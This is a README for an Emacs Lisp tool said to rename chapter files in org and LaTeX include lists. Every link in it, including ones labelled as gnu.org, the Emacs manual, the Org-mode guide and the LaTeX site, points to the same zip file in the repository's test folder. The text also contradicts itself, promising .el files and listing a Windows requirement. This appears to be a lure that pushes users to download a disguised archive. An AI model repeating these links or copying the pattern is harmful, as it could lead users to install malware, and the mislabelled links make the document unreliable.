# 📚 read-chapter - Simplify Renaming Chapter Files

[![Download read-chapter](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip)

read-chapter helps you rename chapter filenames in multi-part books. It works with include lists in org and LaTeX files inside Emacs. This makes organizing and updating large books easier.

## 🔍 What is read-chapter?

read-chapter is a tool for people who write books using Emacs. It lets you rename the files used for chapters quickly. If you write books split into parts and files, this helps keep file names in sync with what you want inside your book project.

If your book has many files listed inside org or LaTeX format, read-chapter updates the chapter filenames in those lists. You do not have to change each name manually every time you rename a file.

## ⚙️ System Requirements

To use read-chapter, your computer needs:

- Windows 10 or later  
- Emacs installed (version 26 or newer recommended)  
- Basic knowledge of how to open files in Emacs  
- A book project with chapters organized in org or LaTeX files

This tool runs inside Emacs only. It will not work as a standalone application.

## 🚀 Getting Started

Follow these steps to download and run read-chapter on your Windows PC.

### 1. Download the Program

Click the big blue button at the top or visit the official release page here:

[Download read-chapter Releases](https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip)

This page has the latest versions. Look for files ending with `.el` or `.elc`. These are Emacs Lisp files you will load in Emacs.

> The file you choose depends on your version of Emacs. `.el` is the source code, `.elc` is the compiled version which can be faster.

Download the file to a folder where you keep your Emacs scripts or tools.

### 2. Open Emacs

Start Emacs on your Windows computer.

If you don’t have Emacs, you can download it from [gnu.org](https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip). Choose the Windows installer and follow the instructions on their site.

### 3. Load read-chapter in Emacs

Once Emacs is open:

- Open the folder where you saved `read-chapter.el` or `read-chapter.elc`.
- Use Emacs to load the file by typing `M-x load-file` then entering the full path to the read-chapter file.
  
  Example:  
  `M-x load-file RET C:/Users/YourName/Documents/read-chapter.el RET`

This will make read-chapter commands available in Emacs.

### 4. Prepare Your Book Files

Make sure your book files list chapters in an org or LaTeX file. The tool expects these lists to follow the normal syntax for including chapters.

For org-mode, your file may look like this:

```
#+INCLUDE: "chapter1.org"
#+INCLUDE: "chapter2.org"
```

For LaTeX, it might be:

```latex
\include{chapter1}
\include{chapter2}
```

### 5. Run read-chapter Commands

With your book file open in Emacs, you can now run commands to rename chapter files inside these include lists.

Use:

`M-x read-chapter-rename`

This command will ask you for the old chapter filename and new chapter filename. It then updates the chapter filename inside your org or LaTeX file includes.

Repeat for each chapter file you want to rename.

## 📁 How read-chapter Works

read-chapter scans your org or LaTeX book file and finds all chapter file names inside include lines. It replaces old names with new ones. This keeps your list clean and up to date as you rename files on your computer.

You do not have to open each file or line manually. The tool handles changes carefully to avoid errors.

## 🛠 Features

- Works with multi-part book projects stored in org or LaTeX files  
- Updates chapter filenames inside include lists automatically  
- Built as an Emacs Lisp script to run inside your Emacs editor  
- Supports large book projects with many chapter files  
- Keeps file and chapter names consistent without manual editing

## ✅ Tips for Using read-chapter

- Always back up your book files before running commands that change filenames.
- Use Emacs undo (`C-/`) if you accidentally rename something.
- Keep your org or LaTeX includes neat and one per line for best results.
- Check your file paths if your book files are in nested folders.
- Use Emacs Bookmarks or Sessions to keep your place when working on multi-file books.

## ⚠️ Common Issues

- If commands do not work, check that read-chapter loaded properly in Emacs with no errors.
- Verify you have write permissions for your book files.
- If you have custom include syntax, read-chapter may not recognize those lines.
- Make sure you close and reopen the book file in Emacs after renaming files outside Emacs.

## 🔗 Additional Resources

- Emacs manual: https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip
- Org-mode guide: https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip
- LaTeX project website: https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip

## 📥 Download and Setup

Visit the release page to download read-chapter for Windows:

[Download read-chapter Releases](https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip)

1. Download the latest `.el` or `.elc` file.  
2. Save it in your Emacs configuration folder or any folder you prefer.  
3. Open Emacs and load the file using `M-x load-file`.  
4. Run `M-x read-chapter-rename` to start renaming chapters in your open book files.  

This setup lets you keep your multi-part book organized without manual edits in large file lists.